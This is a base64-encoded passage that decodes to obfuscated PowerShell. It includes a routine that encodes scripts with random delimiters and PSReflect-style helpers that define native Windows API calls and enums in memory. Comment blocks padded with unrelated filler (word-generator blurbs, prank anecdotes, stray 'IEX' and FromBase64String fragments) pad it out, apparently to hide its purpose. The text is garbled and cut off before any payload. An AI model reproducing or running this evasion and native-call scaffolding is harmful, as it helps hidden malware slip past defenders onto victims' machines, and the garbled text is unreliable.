dUpKRVljSUdjaUtXcmdsKCc6JykpKQogICAgIkBAIgogICAgIyBBZGQgbGV0dGVycyBhLXogd2l0aCByYW5kb20gY2FzZSB0byAkUmFuZG9tRGVsaW1pdGVycy4KICAgIEAoKFdVSkpFWUNJZ0NpS1dyZ2woJ2EnKSksKHd1SkpFWWNJR0NJa1dyR2woJ2InKSksKFd1ampFeWNJZ0NpS1dyR0woJ2MnKSksKHd1akpFWUNJZ2Npa3dyZ0woJ2QnKSksKFd1SmpFeUNJR0NJS3dyZ2woJ2UnKSksKHdVSkplWWNpZ0NJa1dyZ2woJ2YnKSksKFd1SkpFeWNJR0NJS1dSZ0woJ2cnKSksKHd1ampleWNpR2Npa1dyZ0woJ2gnKSksKHd1SkplWUNpR0NJS1dyZ2woJ2knKSksKHdVakpFWUNpZ2NJS3dSZ2woJ2onKSksKHdVampFWUNJZ0NJS1dSR0woJ2snKSksKHdVSkpFWUNpR0NJa1dyR0woJ2wnKSksKFd1SmplWWNJR2NJS1dyZ2woJ20nKSksKHdVamplWUNpR0NpS1dSR0woJ24nKSksKFd1SmpFWWNJZ0NJa3dyR2woJ28nKSksKHd1SkpFeWNJR0NpS3dyZ2woJ3AnKSksKFd1akplWUNJR2NJa3dyR0woJ3EnKSksKHdVSkpFeUNJZ0NJa1dSR2woJ3InKSksKHd1SkplWWNJR0NJS1dyZ0woJ3MnKSksKHd1ampFWUNJR2Npa1dSZ0woJ3QnKSksKFdVampFeUNpZ0NJa1dyR0woJ3UnKSksKHd1akpleWNJR2NJS1dyR2woJ3YnKSksKHd1akplWUNJR0NJS3dyZ0woJ3cnKSksKFd1SkplWWNJZ0NJa1dyZ0woJ3gnKSksKHdVakpleUNpZ0NpS1dyZ2woJ3knKSksKFdVSkpFWWNpR2Npa1dyZ2woJ3onKSkpIHwgRm9yRWFjaC1PYmplY3QgeyRRT2g3a1YxMUZSZVM2XzJuaSA9ICRfOyBJZigoKEdldC1SYW5kb20gLUlucHV0IEAoKDIgLSAxKS4uKDIgKyAoMSAtIDEpKSkpLSgzIC0gMikgLWVxIDApKSB7JFFPSDdLVjExRlJlUzZfMm5JID0gJHFPaDdrVjExRnJlUzZfMk5pLlRvVXBwZXIoKX0gJEFWdlM4eTEyS3RNd19kNSArPSAkUU9IN0t2MTFmUmVTNl8yTkl9CiAgICAiQEAiCiAgICAjIE9ubHkgdXNlIGEgc3Vic2V0IG9mIGN1cnJlbnQgZGVsaW1pdGVycyB0byByYW5kb21pemUgd2hhdCB5b3Ugc2VlIGluIGV2ZXJ5IGl0ZXJhdGlvbiBvZiB0aGlzIHNjcmlwdCdzIG91dHB1dC4KICAgICRBVlZzOHkxMktUbXdfZDUgPSAoR2V0LVJhbmRvbSAtSW5wdXQgJEF2dlM4eTEya1RNV19kNSAtQ291bnQgKCRBdnZTOFkxMmt0bVdfZDUuQ291bnQvKDIgKyAyKSkpCgogICAgIyBDb252ZXJ0ICRTY3JpcHRTdHJpbmcgdG8gZGVsaW1pdGVkIEJpbmFyeSB2YWx1ZXMgaW4gW0NoYXJdIGFycmF5IHNlcGFyYXRlZCBieSByYW5kb20gZGVsaW1pdGVyIGZyb20gZGVmaW5lZCBsaXN0ICRSYW5kb21EZWxpbWl0ZXJzLgogICAgJHhOVEoydzgxVkogPSAod3VqSkVZQ0lHQ2lrV3JnbCgnJykpCiAgICAoW0NoYXJbXV0kUTdYQVFucTFZODhlKSB8IEZvckVhY2gtT2JqZWN0IHskWG50ajJ3ODFWaiArPSAoW0NvbnZlcnRdOjpUb1N0cmluZygoW0ludF1bQ2hhcl0kXyksJGdtRF9KTzhJQ2lwKSArIChHZXQtUmFuZG9tIC1JbnB1dCAkQXZ2czh5MTJrdG1XX2Q1KSl9CgoiQApmdW5jdGlvbiB6ewoKICAgIFtPdXRwdXRUeXBlKFtIYXNodGFibGVdKV0KICAgIFBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5PSRUcnVlLCBWYWx1ZUZyb21QaXBlbGluZUJ5UHJvcGVydHlOYW1lPSRUcnVlKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICREbGxOYW1lLAoKICAgICAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeT0kVHJ1ZSwgVmFsdWVGcm9tUGlwZWxpbmVCeVByb3BlcnR5TmFtZT0kVHJ1ZSldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkRnVuY3Rpb25OYW1lLAoKICAgICAgICBbUGFyYW1ldGVyKFZhbHVlRnJvbVBpcGVsaW5lQnlQcm9wZXJ0eU5hbWU9JFRydWUpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJEVudHJ5UG9pbnQsCgogICAgICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5PSRUcnVlLCBWYWx1ZUZyb21QaXBlbGluZUJ5UHJvcGVydHlOYW1lPSRUcnVlKV0KICAgICAgICBbVHlwZV0KICAgICAgICAkUmV0dXJuVHlwZSwKCiAgICAgICAgW1BhcmFtZXRlcihWYWx1ZUZyb21QaXBlbGluZUJ5UHJvcGVydHlOYW1lPSRUcnVlKV0KICAgICAgICBbVHlwZVtdXQogICAgICAgICRQYXJhbWV0ZXJUeXBlcywKCiAgICAgICAgW1BhcmFtZXRlcihWYWx1ZUZyb21QaXBlbGluZUJ5UHJvcGVydHlOYW1lPSRUcnVlKV0KICAgICAgICBbUnVudGltZS5JbnRlcm9wU2VydmljZXMuQ2FsbGluZ0NvbnZlbnRpb25dCiAgICAgICAgJE5hdGl2ZUNhbGxpbmdDb252ZW50aW9uID0gW1J1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLkNhbGxpbmdDb252ZW50aW9uXTo6U3RkQ2FsbCwKCiAgICAgICAgW1BhcmFtZXRlcihWYWx1ZUZyb21QaXBlbGluZUJ5UHJvcGVydHlOYW1lPSRUcnVlKV0KICAgICAgICBbUnVudGltZS5JbnRlcm9wU2VydmljZXMuQ2hhclNldF0KICAgICAgICAkQ2hhcnNldCA9IFtSdW50aW1lLkludGVyb3BTZXJ2aWNlcy5DaGFyU2V0XTo6QXV0bywKCiAgICAgICAgW1BhcmFtZXRlcihWYWx1ZUZyb21QaXBlbGluZUJ5UHJvcGVydHlOYW1lPSRUcnVlKV0KICAgICAgICBbU3dpdGNoXQogICAgICAgICRTZXRMYXN0RXJyb3IsCgogICAgICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5PSRUcnVlKV0KICAgICAgICBbVmFsaWRhdGVTY3JpcHQoeygkXyAtaXMgW1JlZmxlY3Rpb24uRW1pdC5Nb2R1bGVCdWlsZGVyXSkgLW9yICgkXyAtaXMgW1JlZmxlY3Rpb24uQXNzZW1ibHldKX0pXQogICAgICAgICRNb2R1bGUsCgogICAgICAgIFtWYWxpZGF0ZU5vdE51bGwoKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICROYW1lc3BhY2UgPSAnJwogICAgKQoKICAgIEJFR0lOCiAgICB7CiAgICAgICAgJFR5cGVIYXNoID0gQHt9CiAgICB9CgogICAgUFJPQ0VTUwogICAgewogICAgICAgIGlmICgkTW9kdWxlIC1pcyBbUmVmbGVjdGlvbi5Bc3NlbWJseV0pCiAgICAgICAgewogICAgICAgICAgICBpZiAoJE5hbWVzcGFjZSkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJFR5cGVIYXNoWyREbGxOYW1lXSA9ICRNb2R1bGUuR2V0VHlwZSgiJE5hbWVzcGFjZS4kRGxsTmFtZSIpCiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkVHlwZUhhc2hbJERsbE5hbWVdID0gJE1vZHVsZS5HZXRUeXBlKCREbGxOYW1lKQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIGVsc2UKICAgICAgICB7CiAgICAgICAgICAgICMgRGVmaW5lIG9uZSB0eXBlIGZvciBlYWNoIERMTAogICAgICAgICAgICBpZiAoISRUeXBlSGFzaC5Db250YWluc0tleSgkRGxsTmFtZSkpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIGlmICgkTmFtZXNwYWNlKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICRUeXBlSGFzaFskRGxsTmFtZV0gPSAkTW9kdWxlLkRlZmluZVR5cGUoIiROYW1lc3BhY2UuJERsbE5hbWUiLCAnUHVibGljLElFWEZpZWxkSW5pdCcpCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgJFR5cGVIYXNoWyREbGxOYW1lXSA9ICRNb2R1bGUuRGVmaW5lVHlwZSgkRGxsTmFtZSwgJ1B1YmxpYyxJRVhGaWVsZEluaXQnKQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CgogICAgICAgICAgICAkTWV0aG9kID0gJFR5cGVIYXNoWyREbGxOYW1lXS5EZWZpbmVNZXRob2QoCiAgICAgICAgICAgICAgICAkRnVuY3Rpb25OYW1lLAogICAgICAgICAgICAgICAgJ1B1YmxpYyxTdGF0aWMsUGludm9rZUltcGwnLAogICAgICAgICAgICAgICAgJFJldHVyblR5cGUsCiAgICAgICAgICAgICAgICAkUGFyYW1ldGVyVHlwZXMpCgogICAgICAgICAgICAjIE1ha2UgZWFjaCBCeVJlZiBwYXJhbWV0ZXIgYW4gT3V0IHBhcmFtZXRlcgogICAgICAgICAgICAkaSA9IDEKICAgICAgICAgICAgZm9yZWFjaCgkUGFyYW1ldGVyIGluICRQYXJhbWV0ZXJUeXBlcykKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgaWYgKCRQYXJhbWV0ZXIuSXNCeVJlZikKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICBbdm9pZF0gJE1ldGhvZC5EZWZpbmVQYXJhbWV0ZXIoJGksICdPdXQnLCAkbnVsbCkKICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAkaSsrCiAgICAgICAgICAgIH0KCiAgICAgICAgICAgICREbGxJbXBvcnQgPSBbUnVudGltZS5JbnRlcm9wU2VydmljZXMuRGxsSW1wb3J0QXR0cmlidXRlXQogICAgICAgICAgICAkU2V0TGFzdEVycm9yRmllbGQgPSAkRGxsSW1wb3J0LkdldEZpZWxkKCdTZXRMYXN0RXJyb3InKQogICAgICAgICAgICAkQ2FsbGluZ0NvbnZlbnRpb25GaWVsZCA9ICREbGxJbXBvcnQuR2V0RmllbGQoJ0NhbGxpbmdDb252ZW50aW9uJykKICAgICAgICAgICAgJENoYXJzZXRGaWVsZCA9ICREbGxJbXBvcnQuR2V0RmllbGQoJ0NoYXJTZXQnKQogICAgICAgICAgICAkRW50cnlQb2ludEZpZWxkID0gJERsbEltcG9ydC5HZXRGaWVsZCgnRW50cnlQb2ludCcpCiAgICAgICAgICAgIGlmICgkU2V0TGFzdEVycm9yKSB7ICRTTEVWYWx1ZSA9ICRUcnVlIH0gZWxzZSB7ICRTTEVWYWx1ZSA9ICRGYWxzZSB9CgogICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydFbnRyeVBvaW50J10pIHsgJEV4cG9ydGVkRnVuY05hbWUgPSAkRW50cnlQb2ludCB9IGVsc2UgeyAkRXhwb3J0ZWRGdW5jTmFtZSA9ICRGdW5jdGlvbk5hbWUgfQoKICAgICAgICAgICAgIyBFcXVpdmFsZW50IHRvIEMjIHZlcnNpb24gb2YgW0RsbEltcG9ydChEbGxOYW1lKV0KICAgICAgICAgICAgJENvbnN0cnVjdG9yID0gW1J1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLkRsbEltcG9ydEF0dHJpYnV0ZV0uR2V0Q29uc3RydWN0b3IoW1N0cmluZ10pCiAgICAgICAgICAgICREbGxJbXBvcnRBdHRyaWJ1dGUgPSBOZXctT2JqZWN0IFJlZmxlY3Rpb24uRW1pdC5DdXN0b21BdHRyaWJ1dGVCdWlsZGVyKCRDb25zdHJ1Y3RvciwKICAgICAgICAgICAgICAgICREbGxOYW1lLCBbUmVmbGVjdGlvbi5Qcm9wZXJ0eUluZm9bXV0gQCgpLCBbT2JqZWN0W11dIEAoKSwKICAgICAgICAgICAgICAgIFtSZWZsZWN0aW9uLkZpZWxkSW5mb1tdXSBAKCRTZXRMYXN0RXJyb3JGaWVsZCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRDYWxsaW5nQ29udmVudGlvbkZpZWxkLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJENoYXJzZXRGaWVsZCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRFbnRyeVBvaW50RmllbGQpLAogICAgICAgICAgICAgICAgW09iamVjdFtdXSBAKCRTTEVWYWx1ZSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAoW1J1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLkNhbGxpbmdDb252ZW50aW9uXSAkTmF0aXZlQ2FsbGluZ0NvbnZlbnRpb24pLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgIChbUnVudGltZS5JbnRlcm9wU2VydmljZXMuQ2hhclNldF0gJENoYXJzZXQpLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICRFeHBvcnRlZEZ1bmNOYW1lKSkKCiAgICAgICAgICAgICRNZXRob2QuU2V0Q3VzdG9tQXR0cmlidXRlKCREbGxJbXBvcnRBdHRyaWJ1dGUpCiAgICAgICAgfQogICAgfQoKICAgIEVORAogICAgewogICAgICAgIGlmICgkTW9kdWxlIC1pcyBbUmVmbGVjdGlvbi5Bc3NlbWJseV0pCiAgICAgICAgewogICAgICAgICAgICByZXR1cm4gJFR5cGVIYXNoCiAgICAgICAgfQoKICAgICAgICAkUmV0dXJuVHlwZXMgPSBAe30KCiAgICAgICAgZm9yZWFjaCAoJEtleSBpbiAkVHlwZUhhc2guS2V5cykKICAgICAgICB7CiAgICAgICAgICAgICRUeXBlID0gJFR5cGVIYXNoWyRLZXldLkNyZWF0ZVR5cGUoKQoKICAgICAgICAgICAgJFJldHVyblR5cGVzWyRLZXldID0gJFR5cGUKICAgICAgICB9CgogICAgICAgIHJldHVybiAkUmV0dXJuVHlwZXMKICAgIH0KfQo8Iz4+ClNwPWVsbGluZyBhbmQgYygpClRoaXMgdG9vbCBjYW4gYmUgYW4gZXhjZWxsZW50IHdheSB0byBpbXByb3ZlIGMoKSBvciBwcmFjdGljZSBmb3IgcigpIGJlZXMuIElmIGFuIHEoKSB3b3JkIG8oKSwgcCgpIHVwIHRoZSBtZWFuaW5nIHdpbGwgaGVscCBzdHVkZW50cyBpbmNyZWFzZSB0aGUgbnVtYmVyIG9mIHdvcmRzIHRoZXkga25vdy4gV29ya2luZyB3aXRoIGEgcGFydG5lciwgc3R1ZGVudHMgY2FuIHRlc3QgZWFjaCBvdGhlciBvbiB0aGUgcigpIGZvciB0aGUgcmFuZG9taXplZCB3b3JkcyBtKClkLgoKTmFtZSBJbnNwaXJhdGlvbgpJZiB5b3UgbmVlZCB0byBjcmVhdGUgYSBuYW1lIGZvciBhIHByb2R1Y3QsIGFuIGV2ZW50LCBhIGJhbmQgb3IgZm9yIGFueXRoaW5nIGVsc2UsIHRoaXMgdG9vbCBjYW4gYmUgcXVpdGUgaGVscGZ1bC4gQXMgeW91IGNvbnNpZGVyIG5hbWVzLCBtKCkgYSBudW1iZXIgb2YgcmFuZG9tIHdvcmRzIGFuZCBzZWUgaG93IHRoZXkgaW1wYWN0IHdoYXQgeW91IGhhdmUgYWxyZWFkeSBjb21lIHVwIHdpdGguIElucHV0dGluZyB1bmlxdWUgd29yZHMgeW91IG1heSBub3QgaGF2ZSBjb25zaWRlcmVkIGNhbiBzcGFyayBhZGRpdGlvbmFsIGNyZWF0aXZpdHkgdG8gZXZlbnR1YWxseSBoZWxwIHlvdSBwcm9kdWNlIHRoZSBwZXJmZWN0IG5hbWUgZm9yIHlvdXIgcHJvamVjdC4gSWYgeW91J3JlIHAoKSBmb3IgZ29vZCBjaGFyYWN0ZXIgbmFtZXMgb3IgYmFieSBuYW1lcywgeW91IG1pZ2h0IGJlIGludGVyZXN0ZWQgaW4gb3VyIHJhbmRvbSBuYW1lIGdlbmVyYXRvci4KClRoZSBhYm92ZSBsaXN0IGlzIG5vdCBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldFN0cmluZyhbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKC4gVGhlcmUgYXJlIGxpdGVyYWxseSBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldFN0cmluZyhbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCBvZiB3YXlzIHRoZSBSYW5kb20gV29yZCBHZW5lcmF0b3IgY2FuIGJlIHVzZWQuIFBsZWFzZSBmZWVsIGZyZWUgdG8gc2hhcmUgdGhlIHdheSB5b3UgdXNlIHRoaXMgdG9vbCwgYW5kIHdlIGFsd2F5cyB3ZWxjb21lIHN1Z2dlc3Rpb25zIG9uIGhvdyB3ZSBjYW4gaW1wcm92ZSBpdCB0byBzZXJ2ZSB5b3UgYmV0dGVyLiBXZSBhcmUgYWxzbyBpbnRlcmVzdGVkIGluIG5ldyB3b3JkIGdlbmVyYXRvcnMgeW91J2QgYmUgaW50ZXJlc3RlZCBpbiB1cyBjcmVhdGluZy4gTWFueSBvZiB0aGUgdG9vbHMgb24gdGhpcyB3ZWJzaXRlIGNhbWUgZnJvbSBpZGVhcyBmcm9tIHBlb3BsZSBsaWtlIHlvdSB3aG8gY29udGFjdGVkIHVzLiBQbGVhc2UgdGFrZSB0aGUgdGltZSB0byBleHBsb3JlIHRoZSBvdGhlciByYW5kb20gZ2VuZXJhdG9ycyB3ZSBoYXZlIGF2YWlsCgojPjwjPuKAnFRoaXMgb25lIHRpbWUgaW4gOXRoIGdyYWRlLCBteSBmcmllbmQgYW5kIEkgZGVjaWRlZCB0byB1c2UgdGhlIHJlc3Ryb29tIElFWCBhIGJpZyB0ZXN0LiBJIGRpZG50IGdpdmUgYSBzaHQgYWJvdXQgdGhpcyB0ZXN0LCBzbyBJIHBsYXlmdWxseSBwcmV0ZW5kZWQgdG8gZ2V0IHJlYWxseSB1cHNldC4gSW4gYXR0ZW1wdCB0byBiZSBvYnZpb3VzbHkgbm90IG1hZCwgSSBraWNrIGEgcGlwZSBvbiB0aGUgdG9wIG9mIGEgdXJpbmFsLCBhY2NpZGVudGFsbHkga25vY2tpbmcgaXQgb3V0IG9mIHRoZSB0b3Agb2YgdGhlIHRvaWxldC4gSXQgd2FzIHN0aWxsIGNvbm5lY3RlZCB0byB0aGUgd2FsbCBob3dldmVyLiBUdXJucyBvdXQsIEkgY291bGQgYWltIHRoZSBwaXBlIGluIGRpZmZlcmVudCBkaXJlY3Rpb25zLiBTbywgSSBhaW1lZCBpdCBzdHJhaWdodCBvdXQgYW5kIHRyaWVkIGZsdXNoaW5nIHRoZSB0b2lsZXQuIFRoZSB3YXRlciBMQVVOQ0hFRCBPVVQgT0YgVEhFIFBJUEUgQU5EIEhJVCBUSEUgV0FMTCBPTiBUSEUgT1RIRVIgU0lERSBPRiBUSEUgUk9PTS4gTXkgZnJpZW5kIGFuZCBJIHdlcmUgZmxpcHBpbmcgb3V0LiBUaGlzIGdhdmUgbWUgYSBicmlnaHQgaWRlYS4gSSBwdXQgdGhlIHBpcGUgaW4gc3VjaCBhIHNwb3Qgd2hlcmUgaXQgbG9va2VkIGxpa2UgaXQgd2FzIHByaW9yIHRvIHVzIGtpY2tpbmcgdGhlIGYqayBvdXQgb2YgaXQuIEhvd2V2ZXIsIEkgcHVsbGVkIGl0IG91dCBldmVyIHNvIHNsaWdodGx5IHNvIHdhdGVyIHdvdWxkIHNwcmF5IG91ciBuZXh0IHVuc3VzcGVjdGluZyB2aWN0aW0uIEkgcmVtZW1iZXIga2lkcyBjb21pbmcgb3V0IG9mIHRoZSBiYXRocm9vbSBkcmVuY2hlZCBpbiB3YXRlciwgY3Vzc2luZyB0aGVpciBicmFpbnMgb3V0IGJlY2F1c2UgdGhleSB3ZXJlIHNvIG1hZC4gR29vZCB0aW1lcy7igJ0jPgo8Iz7igJxUaGlzIG9uZSB0aW1lIGluIDl0aCBncmFkZSwgbXkgZnJpZW5kIGFuZCBJIGRlY2lkZWQgdG8gdXNlIHRoZSByZXN0cm9vbSBJRVggYSBiaWcgdGVzdC4gSSBkaWRudCBnaXZlIGEgc2h0IGFib3V0IHRoaXMgdGVzdCwgc28gSSBwbGF5ZnVsbHkgcHJldGVuZGVkIHRvIGdldCByZWFsbHkgdXBzZXQuIEluIGF0dGVtcHQgdG8gYmUgb2J2aW91c2x5IG5vdCBtYWQsIEkga2ljayBhIHBpcGUgb24gdGhlIHRvcCBvZiBhIHVyaW5hbCwgYWNjaWRlbnRhbGx5IGtub2NraW5nIGl0IG91dCBvZiB0aGUgdG9wIG9mIHRoZSB0b2lsZXQuIEl0IHdhcyBzdGlsbCBjb25uZWN0ZWQgdG8gdGhlIHdhbGwgaG93ZXZlci4gVHVybnMgb3V0LCBJIGNvdWxkIGFpbSB0aGUgcGlwZSBpbiBkaWZmZXJlbnQgZGlyZWN0aW9ucy4gU28sIEkgYWltZWQgaXQgc3RyYWlnaHQgb3V0IGFuZCB0cmllZCBmbHVzaGluZyB0aGUgdG9pbGV0LiBUaGUgd2F0ZXIgTEFVTkNIRUQgT1VUIE9GIFRIRSBQSVBFIEFORCBISVQgVEhFIFdBTEwgT04gVEhFIE9USEVSIFNJREUgT0YgVEhFIFJPT00uIE15IGZyaWVuZCBhbmQgSSB3ZXJlIGZsaXBwaW5nIG91dC4gVGhpcyBnYXZlIG1lIGEgYnJpZ2h0IGlkZWEuIEkgcHV0IHRoZSBwaXBlIGluIHN1Y2ggYSBzcG90IHdoZXJlIGl0IGxvb2tlZCBsaWtlIGl0IHdhcyBwcmlvciB0byB1cyBraWNraW5nIHRoZSBmKmsgb3V0IG9mIGl0LiBIb3dldmVyLCBJIHB1bGxlZCBpdCBvdXQgZXZlciBzbyBzbGlnaHRseSBzbyB3YXRlciB3b3VsZCBzcHJheSBvdXIgbmV4dCB1bnN1c3BlY3RpbmcgdmljdGltLiBJIHJlbWVtYmVyIGtpZHMgY29taW5nIG91dCBvZiB0aGUgYmF0aHJvb20gZHJlbmNoZWQgaW4gd2F0ZXIsIGN1c3NpbmcgdGhlaXIgYnJhaW5zIG91dCBiZWNhdXNlIHRoZXkgd2VyZSBzbyBtYWQuIEdvb2QgdGltZXMu4oCdIz4KPCM+4oCcSSB3YXMgYXQgYSBzd2FuayBiYXIgZm9yIGEgd29yayBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldFN0cmluZyhbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCwgW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRTdHJpbmcoW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZyggc29tZSBncmFkIHN0dWRlbnRzIHdlIGooKSBmb3IgYW4gZigpIHByb2dyYW0uIEFmdGVyIHdlIGhhZCBhbGwgaGFkIGsoKSBkcmlua3MsIG9uZSBvZiB0aGUgc3R1ZGVudHMgc2FpZCB0aGV5IGRvbnQgbGlrZSBzbW9rZXMgYmVjYXVzZSB0aGV5IHRhc3RlIGxpa2UgYS4gTXkgYm9zcyByZXBsaWVkLCBtYXliZSB5b3UgaGF2ZW50IGhhZCBnb29kIHNtb2tlcy4gU28gSSBjdXQgaW4sIG1heWJlIHlvdSBoYXZlbnQgaGFkIGdvb2QgYS4gSSB3YXMgYXNrZWQgdG8gbGVhdmUu4oCdU291cmNlIz4KPCNUaGF0cyBEZWRpY2F0aW9uU291cmNlIE9uZSB0aW1lIEkgYXRlIDI2IGNob2NvbGF0ZSBjaGlwIGkoKSBiZWNhdXNlIEkgd2FzIG1hZCBhdCBteSBsaXR0bGUgbCgpIGFuZCBkaWRudCB3YW50IGhlciB0byBoYXZlIGFueS4gSSBwdWtlZCBhbGwgb3ZlciB0aGUgcGxhY2Uu4oCdIFNvdXJjZSM+Cjwj4oCcVGhpcyBvbmUgdGltZSBpbiA5dGggZ3JhZGUsIG15IGZyaWVuZCBhbmQgSSBkZWNpZGVkIHRvIHVzZSB0aGUgcmVzdHJvb20gSUVYIGEgYmlnIHRlc3QuIEkgZGlkbnQgZ2l2ZSBhIHNodCBhYm91dCB0aGlzIHRlc3QsIHNvIEkgcGxheWZ1bGx5IHByZXRlbmRlZCB0byBnZXQgcmVhbGx5IHVwc2V0LiBJbiBhdHRlbXB0IHRvIGJlIG9idmlvdXNseSBub3QgbWFkLCBJIGtpY2sgYSBwaXBlIG9uIHRoZSB0b3Agb2YgYSB1cmluYWwsIGFjY2lkZW50YWxseSBrbm9ja2luZyBpdCBvdXQgb2YgdGhlIHRvcCBvZiB0aGUgdG9pbGV0LiBJdCB3YXMgc3RpbGwgY29ubmVjdGVkIHRvIHRoZSB3YWxsIGhvd2V2ZXIuIFR1cm5zIG91dCwgSSBjb3VsZCBhaW0gdGhlIHBpcGUgaW4gZGlmZmVyZW50IGRpcmVjdGlvbnMuIFNvLCBJIGFpbWVkIGl0IHN0cmFpZ2h0IG91dCBhbmQgdHJpZWQgZmx1c2hpbmcgdGhlIHRvaWxldC4gVGhlIHdhdGVyIExBVU5DSEVEIE9VVCBPRiBUSEUgUElQRSBBTkQgSElUIFRIRSBXQUxMIE9OIFRIRSBPVEhFUiBTSURFIE9GIFRIRSBST09NLiBNeSBmcmllbmQgYW5kIEkgd2VyZSBmbGlwcGluZyBvdXQuIFRoaXMgZ2F2ZSBtZSBhIGJyaWdodCBpZGVhLiBJIHB1dCB0aGUgcGlwZSBpbiBzdWNoIGEgc3BvdCB3aGVyZSBpdCBsb29rZWQgbGlrZSBpdCB3YXMgcHJpb3IgdG8gdXMga2lja2luZyB0aGUgZiprIG91dCBvZiBpdC4gSG93ZXZlciwgSSBwdWxsZWQgaXQgb3V0IGV2ZXIgc28gc2xpZ2h0bHkgc28gd2F0ZXIgd291bGQgc3ByYXkgb3VyIG5leHQgdW5zdXNwZWN0aW5nIHZpY3RpbS4gSSByZW1lbWJlciBraWRzIGNvbWluZyBvdXQgb2YgdGhlIGJhdGhyb29tIGRyZW5jaGVkIGluIHdhdGVyLCBjdXNzaW5nIHRoZWlyIGJyYWlucyBvdXQgYmVjYXVzZSB0aGV5IHdlcmUgc28gbWFkLiBHb29kIHRpbWVzLuKAnSM+CmZ1bmN0aW9uIDEgewogICAgW091dHB1dFR5cGUoW1R5cGVdKV0KICAgIFBhcmFtICgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgTWFuZGF0b3J5PSRUcnVlKV0KICAgICAgICBbVmFsaWRhdGVTY3JpcHQoeygkXyAtaXMgW1JlZmxlY3Rpb24uRW1pdC5Nb2R1bGVCdWlsZGVyXSkgLW9yICgkXyAtaXMgW1JlZmxlY3Rpb24uQXNzZW1ibHldKX0pXQogICAgICAgICRNb2R1bGUsCgogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAxLCBNYW5kYXRvcnk9JFRydWUpXQogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkRnVsbE5hbWUsCgogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAyLCBNYW5kYXRvcnk9JFRydWUpXQogICAgICAgIFtUeXBlXQogICAgICAgICRUeXBlLAoKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMywgTWFuZGF0b3J5PSRUcnVlKV0KICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtIYXNodGFibGVdCiAgICAgICAgJEVudW1FbGVtZW50cywKCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkQml0ZmllbGQKICAgICkKCiAgICBpZiAoJE1vZHVsZSAtaXMgW1JlZmxlY3Rpb24uQXNzZW1ibHldKQogICAgewogICAgICAgIHJldHVybiAoJE1vZHVsZS5HZXRUeXBlKCRGdWxsTmFtZSkpCiAgICB9CgogICAgJEVudW1UeXBlID0gJFR5cGUgLWFzIFtUeXBlXQoKICAgICRFbnVtQnVpbGRlciA9ICRNb2R1bGUuRGVmaW5lRW51bSgkRnVsbE5hbWUsICdQdWJsaWMnLCAkRW51bVR5cGUpCgogICAgaWYgKCRCaXRmaWVsZCkKICAgIHsKICAgICAgICAkRmxhZ3NDb25zdHJ1Y3RvciA9IFtGbGFnc0F0dHJpYnV0ZV0uR2V0Q29uc3RydWN0b3IoQCgpKQogICAgICAgICRGbGFnc0N1c3RvbUF0dHJpYnV0ZSA9IE5ldy1PYmplY3QgUmVmbGVjdGlvbi5FbWl0LkN1c3RvbUF0dHJpYnV0ZUJ1aWxkZXIoJEZsYWdzQ29uc3RydWN0b3IsIEAoKSkKICAgICAgICAkRW51bUJ1aWxkZXIuU2V0Q3VzdG9tQXR0cmlidXRlKCRGbGFnc0N1c3RvbUF0dHJpYnV0ZSkKICAgIH0KCiAgICBmb3JlYWNoICgkS2V5IGluICRFbnVtRWxlbWVudHMuS2V5cykKICAgIHsKICAgICAgICAjIEFwcGx5IHRoZSBzcGVjaWZpZWQgZW51bSB0eXBlIHRvIGVhY2ggZWxlbWVudAogICAgICAgICRudWxsID0gJEVudW1CdWlsZGVyLkRlZmluZUxpdGVyYWwoJEtleSwgJEVudW1FbGVt